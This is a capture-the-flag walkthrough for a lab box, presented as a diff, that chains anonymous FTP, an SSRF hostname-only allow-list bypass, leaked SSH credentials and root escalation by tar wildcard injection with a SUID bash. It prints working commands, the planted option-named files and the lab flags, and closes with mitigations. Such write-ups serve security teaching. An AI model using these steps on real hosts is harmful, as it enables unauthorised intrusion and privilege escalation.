@@ -1,0 +1,226 @@
+==========================================================================
+ OPERATION COLDSTART - Walkthrough
+ Target : Volt Labs "URL Preview" box (kestrel.thm / coldstart)
+ Chain  : FTP leak -> SSRF -> admin notes -> SSH -> tar wildcard -> root
+==========================================================================
+
+TABLE OF CONTENTS
+  1. Objective
+  2. Reconnaissance
+  3. Foothold: Anonymous FTP
+  4. Source Code Review
+  5. SSRF -> Localhost Admin Bypass
+  6. SSH Access
+  7. Post-Exploitation Enumeration
+  8. Privilege Escalation: Tar Wildcard Injection
+  9. Flags & Cleanup
+
+--------------------------------------------------------------------------
+1. OBJECTIVE
+--------------------------------------------------------------------------
+Gain access to the internal "URL Preview" staging service and escalate
+to root on the host. The web app advertises itself as an internal tool
+("do not expose externally"), which is a strong hint that the box is
+built around SSRF + internal-only resources.
+
+Target IPs (may change between lab spins):
+  10.49.168.87   (first spin)
+  10.49.166.101  (second spin)
+
+--------------------------------------------------------------------------
+2. RECONNAISSANCE
+--------------------------------------------------------------------------
+nmap -sC -sV -O -vvv <TARGET_IP>
+
+Findings:
+  PORT   STATE  SERVICE   VERSION
+  21/tcp open  ftp        vsftpd 3.0.5
+  22/tcp open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+  80/tcp open  http       Gunicorn (Flask app)
+
+  ftp-anon: Anonymous FTP login allowed (FTP code 230)
+  http-title: URL Preview - Volt Labs
+  http-server-header: gunicorn
+
+Observations:
+  - Anonymous FTP is enabled -> potential source leak.
+  - Port 80 is a Python Flask app (Gunicorn) called "URL Preview".
+  - SSH is exposed -> end goal will be an interactive shell here.
+
+--------------------------------------------------------------------------
+3. FOOTHOLD: ANONYMOUS FTP
+--------------------------------------------------------------------------
+Connect as anonymous:
+
+  ftp <TARGET_IP>
+  Name: anonymous
+  Password: (anything / blank)
+
+Browse and grab the only file found:
+
+  ftp> ls
+  drwxr-xr-x  2 ftp  ftp  4096 May 09 23:14 pub
+  ftp> cd pub
+  ftp> ls
+  -rw-r--r--  1 ftp  ftp  2446 May 09 23:14 backup.tar.gz
+  ftp> get backup.tar.gz
+
+Inspect the archive locally:
+
+  file backup.tar.gz
+  tar -tzvf backup.tar.gz
+
+It contains the web application source:
+
+  voltlabs-preview/
+    requirements.txt   (flask, requests, gunicorn)
+    README.md
+    app.py
+
+--------------------------------------------------------------------------
+4. SOURCE CODE REVIEW
+--------------------------------------------------------------------------
+Read app.py. Key routes:
+
+  [GET /]            -> renders the index form.
+  [GET /preview]     -> SSRF: takes ?url=, validates only the HOSTNAME
+                        against ALLOWED_HOSTS = {"kestrel.thm"}, then
+                        requests.get(target) and prints the body back.
+  [GET /admin/...]   -> reads /opt/voltlabs-preview/admin_notes.txt, but
+                        only when request.remote_addr starts with "127."
+
+Critical takeaways:
+  - The allow-list checks HOSTNAME ONLY. No scheme check, no port check,
+    no redirect protection.
+  - "kestrel.thm" resolves to 127.0.0.1 via /etc/hosts (per README).
+  - /admin/* is source-IP gated to localhost.
+
+=> We can reach /admin/* from "localhost" by going THROUGH the SSRF:
+   the preview runs on the box, so requests from it come from 127.0.0.1
+   and pass the check.
+
+--------------------------------------------------------------------------
+5. SSRF -> LOCALHOST ADMIN BYPASS
+--------------------------------------------------------------------------
+Fetch the internal admin page through /preview:
+
+  curl -s 'http://<TARGET_IP>/preview?url=http://kestrel.thm/admin/notes'
+
+Result (the internal admin_notes.txt file):
+
+  === INTERNAL ===
+  SSH access for staging:
+    user: webdev
+    pass: V0ltLabs#summer
+  - Mara
+
+Notes / side exploration:
+  - http://kestrel.thm/  -> 404 (internal app has no index route)
+  - /admin/anything      -> "Volt Labs admin endpoint." fallback
+  - The port isn't checked: only the hostname must equal kestrel.thm.
+    SSRF port-scan of 127.0.0.1 showed only port 80 alive
+    (all others -> "Connection refused", 443/10000 dead too).
+
+--------------------------------------------------------------------------
+6. SSH ACCESS
+--------------------------------------------------------------------------
+ssh webdev@<TARGET_IP>
+  Password: V0ltLabs#summer
+
+Grab the user flag:
+
+  webdev@coldstart:~$ cat user.txt
+  THM{96dc7bd50d2fb98fcece01560788b5ab}
+
+--------------------------------------------------------------------------
+7. POST-EXPLOITATION ENUMERATION
+--------------------------------------------------------------------------
+Commands run and results:
+
+  id ; cat /etc/passwd | grep -E '/bin/(ba)?sh'
+     webdev uid=1001 gid=1001
+     root, ubuntu, webdev all have real shells
+
+  ls -la /home /opt /etc/sudoers.d /root
+     /opt/backups        drwxrwx--- webdev webdev   <-- WRITABLE by us
+     /opt/voltlabs-preview  root:voltapp
+
+  sudo -l
+     Sorry, user webdev may not run sudo on coldstart.   <-- no sudo
+
+  find / -perm -4000 2>/dev/null
+     Only stock Ubuntu/snapd SUID binaries (passwd, mount, su, sudo,
+     chfn, snap-confine...). Nothing custom -> SUID not a vector.
+
+  getcap -r / 2>/dev/null
+     Only stock capabilities (ping, mtr-packet, snap-confine).
+
+  cat /etc/crontab ; ls -la /etc/cron*
+     /etc/cron.d/voltlabs-backup  <-- non-standard, suspicious
+
+  cat /etc/cron.d/voltlabs-backup
+     * * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
+
+KEY FINDING:
+  A root cron job runs every minute, cds into /opt/backups (which we can
+  write to) and tars "*". Classic TAR WILDCARD INJECTION.
+
+--------------------------------------------------------------------------
+8. PRIVILEGE ESCALATION: TAR WILDCARD INJECTION
+--------------------------------------------------------------------------
+GNU tar interprets filenames beginning with "-" as command-line options.
+When the cron expands "*" inside a directory we control, we can plant
+files named like tar options and force tar to run a command as root.
+
+Files to plant:
+  --checkpoint=1                    (tar emits a checkpoint every record)
+  --checkpoint-action=exec=sh pwn.sh (run our script at each checkpoint)
+  pwn.sh                            (our root payload)
+
+Execution:
+
+  cd /opt/backups
+  echo 'chmod +s /bin/bash' > pwn.sh
+  touch -- '--checkpoint=1'
+  touch -- '--checkpoint-action=exec=sh pwn.sh'
+
+Wait <= 60s for the cron tick, then verify the SUID bit:
+
+  ls -l /bin/bash
+  -rwsr-sr-x 1 root root ... /bin/bash     <-- owned by root + SUID
+
+Drop to a root shell (privileged mode so bash keeps euid=0):
+
+  bash -p
+  bash-5.2# id
+  uid=0(root) gid=0(root)
+
+--------------------------------------------------------------------------
+9. FLAGS & CLEANUP
+--------------------------------------------------------------------------
+Root flag:
+
+  bash-5.2# cat /root/flag.txt
+  THM{e6ee84a483d67ade06936fcfd1433e8a}
+
+Flags summary:
+  user.txt  THM{96dc7bd50d2fb98fcece01560788b5ab}
+  root/flag THM{e6ee84a483d67ade06936fcfd1433e8a}
+
+Cleanup (so the cron stops re-triggering and bash is restored):
+
+  rm -- /opt/backups/'--checkpoint=1' \
+        /opt/backups/'--checkpoint-action=exec=sh pwn.sh' \
+        /opt/backups/pwn.sh
+  chmod -s /bin/bash
+
+--------------------------------------------------------------------------
+MITIGATIONS (if this were a real engagement)
+--------------------------------------------------------------------------
+  - Disable anonymous FTP or restrict it to a read-only drop zone.
+  - Never keep internal admin credentials in files readable by services.
+  - SSRF: validate scheme + resolved IP, block RFC1918/loopback,
+    reject redirects, and scope to a non-loopback internal host.
+  - Cron/backup jobs: use explicit file lists or dedicated account,
+    never "cd <user-writable-dir> && tar *".
+--------------------------------------------------------------------------
